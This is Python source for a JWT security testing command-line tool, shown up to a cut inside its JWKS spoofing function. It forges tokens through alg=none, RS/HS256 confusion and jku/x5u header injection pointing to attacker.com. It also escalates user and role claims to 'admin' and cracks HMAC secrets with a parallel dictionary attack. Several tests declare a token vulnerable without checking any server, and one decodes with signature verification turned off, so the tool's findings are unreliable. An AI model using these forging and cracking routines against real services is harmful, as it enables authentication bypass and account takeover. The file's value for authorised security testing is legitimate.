#!/usr/bin/env python3
"""
JWT Security Testing Tool
A comprehensive CLI tool for analyzing and testing JWT token security.
"""

import json
import base64
import hashlib
import hmac
import argparse
import sys
import logging
import re
import os
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
import jwt
from jwt.exceptions import InvalidTokenError, DecodeError
import requests
import time
from tqdm import tqdm
from colorama import init, Fore, Back, Style
from utils.debug_utils import setup_debug_logging, debug_print
import concurrent.futures
import multiprocessing
from config_manager import ConfigManager

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Version information
__version__ = "1.0.0"
__author__ = "QuickFix Security Team"
__description__ = "Comprehensive JWT Security Testing Tool"

class CVEAnalyzer:
    def __init__(self, debug=False):
        self.debug = debug

    def decode_token_without_verification(self, token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT token without signature verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT token format")
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode())
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            raise ValueError(f"Failed to decode token: {str(e)}")

    def test_cve_2015_2951_alg_none(self, token: str) -> dict:
        """Test for CVE-2015-2951: alg=none signature bypass vulnerability."""
        print("\U0001F6A8 Testing CVE-2015-2951 (alg=none bypass)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2015-2951",
                "description": "Algorithm None Signature Bypass Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg != 'none':
                none_header = header.copy()
                none_header['alg'] = 'none'
                none_token = (
                    base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
                )
                results["vulnerable"] = True
                results["tests"].append({
                    "test": "Algorithm None Attack",
                    "vulnerable": True,
                    "description": "Token with 'none' algorithm created - signature bypass possible",
                    "exploit_token": none_token,
                    "risk_level": "Critical",
                    "mitigation": "Reject tokens with alg='none'"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2016_10555_rs_hs256(self, token: str, public_key: str = None) -> dict:
        """Test for CVE-2016-10555: RS/HS256 public key mismatch vulnerability."""
        print("\U0001F6A8 Testing CVE-2016-10555 (RS/HS256 confusion)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2016-10555",
                "description": "RS/HS256 Public Key Mismatch Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg in ['RS256', 'RS384', 'RS512'] and public_key:
                hs_header = header.copy()
                hs_header['alg'] = 'HS256'
                try:
                    hs_token = jwt.encode(payload, public_key, algorithm='HS256', headers=hs_header)
                    results["vulnerable"] = True
                    results["tests"].append({
                        "test": "RS/HS256 Algorithm Confusion",
                        "vulnerable": True,
                        "description": "Token verified with public key as HMAC secret",
                        "exploit_token": hs_token,
                        "risk_level": "Critical",
                        "mitigation": "Use different keys for signing and verification"
                    })
                except Exception:
                    pass
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2018_0114_key_injection(self, token: str) -> dict:
        """Test for CVE-2018-0114: Key injection vulnerability."""
        print("\U0001F6A8 Testing CVE-2018-0114 (key injection)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2018-0114",
                "description": "Key Injection Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            injection_vectors = [
                {"jku": "https://attacker.com/keys.json"},
                {"x5u": "https://attacker.com/cert.pem"},
                {"kid": "injected_key_id"}
            ]
            for injection in injection_vectors:
                injected_header = header.copy()
                injected_header.update(injection)
                injected_token = (
                    base64.urlsafe_b64encode(json.dumps(injected_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.' +
                    signature
                )
                results["tests"].append({
                    "test": f"Key Injection via {list(injection.keys())[0]}",
                    "vulnerable": True,
                    "description": f"Header injection possible via {list(injection.keys())[0]}",
                    "injected_header": injection,
                    "exploit_token": injected_token,
                    "risk_level": "High",
                    "mitigation": "Validate and whitelist key sources"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2019_20933_blank_password(self, token: str) -> dict:
        """Test for CVE-2019-20933/CVE-2020-28637: Blank password vulnerability."""
        print("\U0001F6A8 Testing CVE-2019-20933 (blank password)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2019-20933/CVE-2020-28637",
                "description": "Blank Password Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            blank_secrets = ["", " ", "  ", "\t", "\n", "null", "NULL", "None", "NONE"]
            for blank_secret in blank_secrets:
                try:
                    jwt.decode(token, blank_secret, algorithms=['HS256', 'HS384', 'HS512'])
                    results["vulnerable"] = True
                    results["tests"].append({
                        "test": "Blank Password Attack",
                        "vulnerable": True,
                        "description": f"Token verified with blank secret: '{repr(blank_secret)}'",
                        "secret": blank_secret,
                        "risk_level": "Critical",
                        "mitigation": "Reject blank/empty secrets"
                    })
                    break
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2020_28042_null_signature(self, token: str) -> dict:
        """Test for CVE-2020-28042: Null signature vulnerability."""
        print("\U0001F6A8 Testing CVE-2020-28042 (null signature)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2020-28042",
                "description": "Null Signature Vulnerability",
                "vulnerable": False,
                "tests": []
                
            }
            null_signature_token = (
                base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
            )
            try:
                jwt.decode(null_signature_token, options={"verify_signature": False})
                results["vulnerable"] = True
                results["tests"].append({
                    "test": "Null Signature Attack",
                    "vulnerable": True,
                    "description": "Token with null signature accepted",
                    "exploit_token": null_signature_token,
                    "risk_level": "Critical",
                    "mitigation": "Always verify signatures"
                })
            except Exception:
                pass
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2022_21449_psychic_signature(self, token: str) -> dict:
        """Test for CVE-2022-21449: Psychic Signature ECDSA vulnerability."""
        print("\U0001F6A8 Testing CVE-2022-21449 (psychic signature)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2022-21449",
                "description": "Psychic Signature ECDSA Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg in ['ES256', 'ES384', 'ES512']:
                results["tests"].append({
                    "test": "Psychic Signature ECDSA",
                    "vulnerable": True,
                    "description": "ECDSA algorithm detected - check for psychic signature vulnerability",
                    "risk_level": "High",
                    "mitigation": "Update ECDSA implementation to reject r=0 or s=0 signatures",
                    "note": "Requires specific implementation analysis"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2023_placeholder(self, token: str) -> dict:
        # Placeholder for a new CVE test (to be implemented)
        return {"cve": "CVE-2023-XXXXX", "description": "Placeholder for new JWT CVE test", "vulnerable": False, "tests": []}

class JWTSecurityTester:
    def __init__(self, debug: bool = False, config_file: str = "config/default_config.json"):
        self.test_results = []
        self.vulnerabilities = []
        self.secrets_to_try = []
        self.debug = debug
        self.config = ConfigManager(config_file)
        debug_print(f"JWTSecurityTester initialized with debug={debug}", debug)
        self.cve_analyzer = CVEAnalyzer(debug)
        
    def validate_jwt_token(self, token: str) -> bool:
        """Validate JWT token format."""
        if not token or not isinstance(token, str):
            return False
        
        # Check basic JWT format (3 parts separated by dots)
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Check if parts are base64url encoded
        try:
            for part in parts:
                if not part:  # Empty parts are invalid
                    return False
                # Try to decode as base64url
                base64.urlsafe_b64decode(part + '==')
        except Exception:
            return False
        
        return True
    
    def validate_file_path(self, file_path: str) -> bool:
        """Validate if file path exists and is readable."""
        if not file_path or not isinstance(file_path, str):
            return False
        return os.path.isfile(file_path) and os.access(file_path, os.R_OK)
    
    def validate_url(self, url: str) -> bool:
        """Validate URL format."""
        if not url or not isinstance(url, str):
            return False
        url_pattern = re.compile(
            r'^https?://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return bool(url_pattern.match(url))
    
    def print_error(self, message: str, error_type: str = "ERROR"):
        """Print colored error messages."""
        print(f"{Fore.RED}[{error_type}] {message}{Style.RESET_ALL}")
    
    def print_success(self, message: str):
        """Print colored success messages."""
        print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
    
    def print_warning(self, message: str):
        """Print colored warning messages."""
        print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
    
    def print_info(self, message: str):
        """Print colored info messages."""
        print(f"{Fore.CYAN}[INFO] {message}{Style.RESET_ALL}")
    
    def print_header(self, message: str):
        """Print colored header messages."""
        print(f"{Fore.BLUE}{Style.BRIGHT}{'='*60}")
        print(f"{message}")
        print(f"{'='*60}{Style.RESET_ALL}")
    
    def print_version(self):
        """Print version information."""
        print(f"{Fore.MAGENTA}{Style.BRIGHT}JWT Security Testing Tool v{__version__}")
        print(f"Author: {__author__}")
        print(f"Description: {__description__}{Style.RESET_ALL}")
        print()
        
    def load_common_secrets(self):
        """Load common JWT secrets for testing."""
        debug_print("Loading common JWT secrets for testing", self.debug)
        
        # Try to load from config file first
        secrets_file = self.config.get_security("common_secrets_file", "config/common_secrets.txt")
        if os.path.exists(secrets_file):
            try:
                with open(secrets_file, 'r') as f:
                    self.secrets_to_try = [line.strip() for line in f if line.strip()]
                debug_print(f"Loaded {len(self.secrets_to_try)} secrets from {secrets_file}", self.debug)
                return
            except Exception as e:
                debug_print(f"Failed to load secrets from file: {e}", self.debug)
        
        # Fallback to hardcoded secrets
        self.secrets_to_try = [
            "",  # Empty secret
            "secret",
            "SECRET",
            "Secret",
            "password",
            "123456",
            "admin",
            "root",
            "jwt",
            "token",
            "key",
            "private",
            "secretkey",
            "jwtsecret",
            "mysecret",
            "supersecret",
            "verysecret",
            "extremelysecret",
            "ultrasecret",
            "megaultrasecret"
        ]
        debug_print(f"Loaded {len(self.secrets_to_try)} fallback secrets", self.debug)
    
    def decode_token_without_verification(self, token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT token without signature verification."""
        debug_print(f"Decoding token without verification: {token[:20]}...", self.debug)
        try:
            # Split the token
            parts = token.split('.')
            if len(parts) != 3:
                debug_print(f"Invalid JWT format: {len(parts)} parts found", self.debug)
                raise ValueError("Invalid JWT format")
            
            header_b64, payload_b64, signature_b64 = parts
            debug_print(f"Token parts: header={len(header_b64)}, payload={len(payload_b64)}, signature={len(signature_b64)}", self.debug)
            
            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(header_b64 + '==').decode('utf-8'))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8'))
            
            debug_print(f"Decoded header: {header}", self.debug)
            debug_print(f"Decoded payload: {payload}", self.debug)
            
            return header, payload, signature_b64
            
        except Exception as e:
            debug_print(f"Error decoding token: {str(e)}", self.debug)
            raise ValueError(f"Error decoding token: {str(e)}")
    
    def analyze_token_structure(self, token: str) -> Dict[str, Any]:
        """Analyze JWT token structure and basic information."""
        debug_print("Starting token structure analysis", self.debug)
        print("🔍 Analyzing JWT token structure...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            analysis = {
                "token_length": len(token),
                "header": header,
                "payload": payload,
                "signature_length": len(signature),
                "algorithm": header.get('alg', 'unknown'),
                "token_type": header.get('typ', 'JWT'),
                "claims_count": len(payload),
                "timestamp_claims": {}
            }
            
            debug_print(f"Token analysis: length={analysis['token_length']}, algorithm={analysis['algorithm']}, claims={analysis['claims_count']}", self.debug)
            
            # Analyze timestamp claims
            timestamp_fields = ['exp', 'iat', 'nbf']
            for field in timestamp_fields:
                if field in payload:
                    timestamp = payload[field]
                    if isinstance(timestamp, (int, float)):
                        dt = datetime.fromtimestamp(timestamp)
                        analysis["timestamp_claims"][field] = {
                            "timestamp": timestamp,
                            "datetime": dt.isoformat(),
                            "is_expired": field == 'exp' and datetime.now() > dt,
                            "is_future": field == 'nbf' and datetime.now() < dt
                        }
                        debug_print(f"Timestamp claim {field}: {dt.isoformat()}", self.debug)
            
            debug_print("Token structure analysis completed", self.debug)
            return analysis
            
        except Exception as e:
            debug_print(f"Error in token structure analysis: {str(e)}", self.debug)
            return {"error": str(e)}
    
    def test_algorithm_confusion(self, token: str) -> Dict[str, Any]:
        """Test for algorithm confusion vulnerabilities."""
        print("🔄 Testing algorithm confusion attacks...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            
            results = {
                "original_algorithm": original_alg,
                "tests": []
            }
            
            # Test 1: Change algorithm to 'none'
            if original_alg != 'none':
                none_header = header.copy()
                none_header['alg'] = 'none'
                
                # Create token with 'none' algorithm
                none_token = (
                    base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.' +
                    ''  # Empty signature for 'none' algorithm
                )
                
                results["tests"].append({
                    "test": "Algorithm None Attack",
                    "vulnerable": True,
                    "description": "Token with 'none' algorithm created",
                    "token": none_token,
                    "risk_level": "Critical"
                })
            
            # Test 2: Test weak algorithms
            weak_algorithms = ['HS256', 'HS384', 'HS512']
            if original_alg in weak_algorithms:
                results["tests"].append({
                    "test": "Weak Algorithm",
                    "vulnerable": True,
                    "description": f"Using weak algorithm: {original_alg}",
                    "recommendation": "Use RS256, RS384, RS512, ES256, ES384, or ES512",
                    "risk_level": "High"
                })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_signature_verification(self, token: str, secret: str = None) -> Dict[str, Any]:
        """Test signature verification with various secrets."""
        print("🔐 Testing signature verification...")
        
        self.load_common_secrets()
        
        if secret:
            self.secrets_to_try.insert(0, secret)
        
        results = {
            "verified_secrets": [],
            "failed_attempts": len(self.secrets_to_try),
            "tests": []
        }
        
        for test_secret in self.secrets_to_try:
            try:
                # Try to decode with current secret
                decoded = jwt.decode(token, test_secret, algorithms=['HS256', 'HS384', 'HS512'])
                results["verified_secrets"].append({
                    "secret": test_secret,
                    "algorithm": "HS256/HS384/HS512"
                })
                
                results["tests"].append({
                    "test": "Weak Secret Found",
                    "vulnerable": True,
                    "description": f"Token verified with weak secret: '{test_secret}'",
                    "secret": test_secret,
                    "risk_level": "Critical"
                })
                
            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue
        
        # Test with no secret (for RS256 tokens)
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            results["tests"].append({
                "test": "No Signature Verification",
                "vulnerable": True,
                "description": "Token can be decoded without signature verification",
                "recommendation": "Always verify signatures",
                "risk_level": "High"
            })
        except Exception:
            pass
        
        return results
    
    def test_claim_validation(self, token: str) -> Dict[str, Any]:
        """Test JWT claims for security issues."""
        print("📋 Testing claim validation...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "missing_claims": [],
                "insecure_claims": [],
                "tests": []
            }
            
            # Check for required claims
            required_claims = ['exp', 'iat', 'iss', 'aud']
            for claim in required_claims:
                if claim not in payload:
                    results["missing_claims"].append(claim)
                    results["tests"].append({
                        "test": f"Missing {claim} Claim",
                        "vulnerable": True,
                        "description": f"Required claim '{claim}' is missing",
                        "recommendation": f"Always include '{claim}' claim",
                        "risk_level": "Medium"
                    })
            
            # Check expiration
            if 'exp' in payload:
                exp_timestamp = payload['exp']
                if isinstance(exp_timestamp, (int, float)):
                    exp_time = datetime.fromtimestamp(exp_timestamp)
                    if datetime.now() > exp_time:
                        results["tests"].append({
                            "test": "Expired Token",
                            "vulnerable": True,
                            "description": f"Token expired at {exp_time}",
                            "recommendation": "Use valid, non-expired tokens",
                            "risk_level": "Medium"
                        })
            
            # Check issued at time
            if 'iat' in payload:
                iat_timestamp = payload['iat']
                if isinstance(iat_timestamp, (int, float)):
                    iat_time = datetime.fromtimestamp(iat_timestamp)
                    future_time = datetime.now() + timedelta(hours=1)
                    if iat_time > future_time:
                        results["tests"].append({
                            "test": "Future IAT",
                            "vulnerable": True,
                            "description": f"IAT is in the future: {iat_time}",
                            "recommendation": "IAT should not be in the future",
                            "risk_level": "Low"
                        })
            
            # Check for sensitive data in payload
            sensitive_fields = ['password', 'secret', 'key', 'token', 'credential']
            for field in sensitive_fields:
                if field in payload:
                    results["tests"].append({
                        "test": "Sensitive Data in Payload",
                        "vulnerable": True,
                        "description": f"Sensitive field '{field}' found in payload",
                        "recommendation": "Never include sensitive data in JWT payload",
                        "risk_level": "High"
                    })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_token_tampering(self, token: str) -> Dict[str, Any]:
        """Test various token tampering techniques."""
        print("🔧 Testing token tampering...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "tampered_tokens": [],
                "tests": []
            }
            
            # Test 1: Modify user ID
            if 'user_id' in payload or 'sub' in payload or 'user' in payload:
                user_field = 'user_id' if 'user_id' in payload else ('sub' if 'sub' in payload else 'user')
                original_value = payload[user_field]
                
                # Create tampered payload
                tampered_payload = payload.copy()
                tampered_payload[user_field] = "admin" if original_value != "admin" else "superadmin"
                
                # Create tampered token
                tampered_token = (
                    base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                    signature
                )
                
                results["tampered_tokens"].append({
                    "type": "User ID Tampering",
                    "original_value": original_value,
                    "tampered_value": tampered_payload[user_field],
                    "token": tampered_token
                })
                
                results["tests"].append({
                    "test": "User ID Tampering",
                    "vulnerable": True,
                    "description": f"User ID can be modified from '{original_value}' to '{tampered_payload[user_field]}'",
                    "recommendation": "Validate user permissions server-side",
                    "risk_level": "Critical"
                })
            
            # Test 2: Modify roles/permissions
            role_fields = ['role', 'roles', 'permissions', 'scope', 'authorities']
            for role_field in role_fields:
                if role_field in payload:
                    original_roles = payload[role_field]
                    tampered_payload = payload.copy()
                    tampered_payload[role_field] = "admin" if original_roles != "admin" else "superadmin"
                    
                    tampered_token = (
                        base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                        base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                        signature
                    )
                    
                    results["tampered_tokens"].append({
                        "type": "Role Tampering",
                        "original_value": original_roles,
                        "tampered_value": tampered_payload[role_field],
                        "token": tampered_token
                    })
                    
                    results["tests"].append({
                        "test": "Role Tampering",
                        "vulnerable": True,
                        "description": f"Role can be modified from '{original_roles}' to '{tampered_payload[role_field]}'",
                        "recommendation": "Validate roles server-side",
                        "risk_level": "Critical"
                    })
                    break
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_replay_attack(self, token: str) -> Dict[str, Any]:
        """Test for replay attack vulnerabilities."""
        print("🔄 Testing replay attack scenarios...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "replay_vulnerable": False,
                "tests": []
            }
            
            # Check for jti (JWT ID) claim
            if 'jti' not in payload:
                results["replay_vulnerable"] = True
                results["tests"].append({
                    "test": "Missing JTI Claim",
                    "vulnerable": True,
                    "description": "No JWT ID (jti) claim found",
                    "recommendation": "Include unique jti claim to prevent replay attacks",
                    "risk_level": "Medium"
                })
            
            # Check for nonce claim
            if 'nonce' not in payload:
                results["tests"].append({
                    "test": "Missing Nonce",
                    "vulnerable": True,
                    "description": "No nonce claim found",
                    "recommendation": "Include nonce claim for additional replay protection",
                    "risk_level": "Low"
                })
            
            # Check expiration time
            if 'exp' not in payload:
                results["replay_vulnerable"] = True
                results["tests"].append({
                    "test": "No Expiration",
                    "vulnerable": True,
                    "description": "Token has no expiration time",
                    "recommendation": "Always set expiration time",
                    "risk_level": "High"
                })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_cve_2015_2951_alg_none(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2015_2951_alg_none(token)

    def test_cve_2016_10555_rs_hs256(self, token: str, public_key: str = None) -> dict:
        return self.cve_analyzer.test_cve_2016_10555_rs_hs256(token, public_key)

    def test_cve_2018_0114_key_injection(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2018_0114_key_injection(token)

    def test_cve_2019_20933_blank_password(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2019_20933_blank_password(token)

    def test_cve_2020_28042_null_signature(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2020_28042_null_signature(token)

    def test_cve_2022_21449_psychic_signature(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2022_21449_psychic_signature(token)

    def test_cve_2023_placeholder(self, token: str) -> dict:
        return self.cve_analyzer.test_cve_2023_placeholder(token)

    def test_claim_fuzzing(self, token: str) -> Dict[str, Any]:
        """Fuzz claim values to provoke unexpected behaviors."""
        print("🎯 Testing claim fuzzing...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "fuzzing_tests": [],
                "vulnerable_claims": []
            }
            
            # Fuzzing vectors for different claim types
            fuzz_vectors = {
                "string_claims": ["", "null", "undefined", "NaN", "Infinity", "true", "false", 
                                "admin", "root", "superuser", "administrator", "test", "debug"],
                "numeric_claims": [0, -1, 999999999999, 1.1, -1.1, float('inf'), float('-inf'), float('nan')],
                "boolean_claims": [True, False, "true", "false", 1, 0],
                "array_claims": [[], [""], [None], ["admin", "user"], [1, 2, 3]],
                "object_claims": [{}, {"admin": True}, {"role": "admin"}, None]
            }
            
            # Test each claim with fuzzing vectors
            for claim_name, claim_value in payload.items():
                if isinstance(claim_value, str):
                    for fuzz_value in fuzz_vectors["string_claims"]:
                        fuzzed_payload = payload.copy()
                        fuzzed_payload[claim_name] = fuzz_value
                        fuzzed_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(fuzzed_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        results["fuzzing_tests"].append({
                            "claim": claim_name,
                            "original_value": claim_value,
                            "fuzzed_value": fuzz_value,
                            "fuzzed_token": fuzzed_token,
                            "type": "string_fuzzing"
                        })
                elif isinstance(claim_value, (int, float)):
                    for fuzz_value in fuzz_vectors["numeric_claims"]:
                        fuzzed_payload = payload.copy()
                        fuzzed_payload[claim_name] = fuzz_value
                        fuzzed_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(fuzzed_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        results["fuzzing_tests"].append({
                            "claim": claim_name,
                            "original_value": claim_value,
                            "fuzzed_value": fuzz_value,
                            "fuzzed_token": fuzzed_token,
                            "type": "numeric_fuzzing"
                        })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_timestamp_tampering(self, token: str) -> Dict[str, Any]:
        """Test timestamp tampering attacks."""
        print("⏰ Testing timestamp tampering...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "timestamp_tests": [],
                "vulnerable_timestamps": []
            }
            
            current_time = int(time.time())
            timestamp_claims = ['exp', 'iat', 'nbf']
            
            for claim in timestamp_claims:
                if claim in payload:
                    original_timestamp = payload[claim]
                    tampered_payload = payload.copy()
                    
                    # Test various timestamp manipulations
                    timestamp_manipulations = {
                        "future_exp": current_time + 86400 * 365,  # 1 year in future
                        "past_exp": current_time - 86400 * 365,   # 1 year in past
                        "zero_timestamp": 0,
                        "negative_timestamp": -1,
                        "max_timestamp": 9999999999,
                        "string_timestamp": "invalid",
                        "null_timestamp": None
                    }
                    
                    for manipulation_name, tampered_value in timestamp_manipulations.items():
                        tampered_payload[claim] = tampered_value
                        tampered_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        
                        results["timestamp_tests"].append({
                            "claim": claim,
                            "original_value": original_timestamp,
                            "manipulation": manipulation_name,
                            "tampered_value": tampered_value,
                            "tampered_token": tampered_token,
                            "risk_level": "High" if claim == 'exp' else "Medium"
                        })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_dictionary_attack(self, token: str, wordlist_file: str = None, max_attempts: int = 1000, workers: int = 4) -> Dict[str, Any]:
        """Perform high-speed dictionary attack on JWT token using parallel processing."""
        self.print_info("🔍 Performing dictionary attack (parallel)...")
        try:
            results = {
                "attempts_made": 0,
                "secrets_tried": [],
                "cracked_secret": None,
                "attack_successful": False,
                "errors": []
            }
            # Load wordlist
            if wordlist_file:
                if not self.validate_file_path(wordlist_file):
                    self.print_error(f"Wordlist file not found or not readable: {wordlist_file}")
                    return {"error": f"Invalid wordlist file: {wordlist_file}"}
                try:
                    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                        wordlist = [line.strip() for line in f if line.strip()][:max_attempts]
                    self.print_info(f"Loaded {len(wordlist)} words from wordlist: {wordlist_file}")
                except Exception as e:
                    self.print_error(f"Error reading wordlist file: {str(e)}")
                    wordlist = self.secrets_to_try[:max_attempts]
            else:
                wordlist = self.secrets_to_try[:max_attempts]
                self.print_info(f"Using built-in wordlist with {len(wordlist)} common secrets")
            if not wordlist:
                self.print_warning("No secrets to try in dictionary attack.")
                return results
            # Split wordlist into chunks for workers
            chunk_size = max(1, len(wordlist) // workers)
            word_chunks = [wordlist[i:i+chunk_size] for i in range(0, len(wordlist), chunk_size)]
            found_secret = None
            from tqdm import tqdm
            import concurrent.futures
            def try_secrets(secret_list):
                for secret in secret_list:
                    try:
                        jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                        return secret, None
                    except jwt.InvalidSignatureError:
                        continue
                    except Exception as e:
                        return None, str(e)
                return None, None
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
                futures = [executor.submit(try_secrets, chunk) for chunk in word_chunks]
                for f in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Dictionary Progress"):
                    secret, error = f.result()
                    results["attempts_made"] += chunk_size
                    if secret:
                        found_secret = secret
                        results["cracked_secret"] = secret
                        results["attack_successful"] = True
                        self.print_success(f"Secret found: '{secret}'")
                        # Cancel all other futures
                        for fut in futures:
                            fut.cancel()
                        break
                    if error:
                        results["errors"].append(error)
            if not found_secret:
                self.print_warning(f"Dictionary attack failed after {results['attempts_made']} attempts")
            return results
        except Exception as e:
            self.print_error(f"Error in dictionary attack: {str(e)}")
            return {"error": str(e)}

    def test_jwks_validation(self, token: str, jwks_url: str = None) -> Dict[str, Any]:
        """Test JWT validation against JWKS (JSON Web Key Set)."""
        print("🔑 Testing JWKS validation...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "jwks_tests": [],
                "key_validation": {}
            }
            
            if jwks_url:
                try:
                    response = requests.get(jwks_url, timeout=10)
                    if response.status_code == 200:
                        jwks = response.json()
                        results["jwks_retrieved"] = True
                        results["jwks_keys_count"] = len(jwks.get('keys', []))
                        
                        # Test each key in the JWKS
                        for key in jwks.get('keys', []):
                            key_id = key.get('kid', 'unknown')
                            try:
                                # Try to verify token with this key
                                jwt.decode(token, key, algorithms=['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'])
                                results["key_validation"][key_id] = {
                                    "valid": True,
                                    "algorithm": key.get('alg', 'unknown')
                                }
                            except Exception:
                                results["key_validation"][key_id] = {
                                    "valid": False,
                                    "algorithm": key.get('alg', 'unknown')
                                }
                    else:
                        results["jwks_retrieved"] = False
                        results["error"] = f"Failed to retrieve JWKS: HTTP {response.status_code}"
                except Exception as e:
                    results["jwks_retrieved"] = False
                    results["error"] = str(e)
            
            # Test for missing kid in header
            if 'kid' not in header:
                results["jwks_tests"].append({
                    "test": "Missing Key ID",
                    "vulnerable": True,
                    "description": "No 'kid' claim in JWT header",
                    "risk_level": "Medium",
                    "mitigation": "Include 'kid' claim for key identification"
                })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_jwks_spoofing(self, token: str, jwks_url: str = None) -> Dict[str, Any]:
        """Test for JWKS spoofing vulnerabilities."""
        print("🎭 Testing JWKS spoofing attacks...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "jwks_spoofing_tests": [],
                "spoofed_jwks": {},
                "vulnerabilities": []
            }
            
            # Generate attacker-controlled keys
            debug_print("Generating attacker-controlled RSA key pair", self.debug)
            attacker_keys = self.generate_rsa_key_pair(2048)
            
            if "error" in attacker_keys:
                return {"error": f"Failed to generate attacker keys: {attacker_keys['error']}"}
            
            # Create spoofed JWKS with attacker's public key
            spoofed_jwks = {
                "keys": [
                    {
                        "kty": "RSA",
                        "kid": "attacker-key-1",
                        "use": "sig",
                        "alg": "RS256",
                        "n": "attacker-modulus",  # This would be the actual modulus
                        "e": "AQAB"
                    }
                ]
            }
            
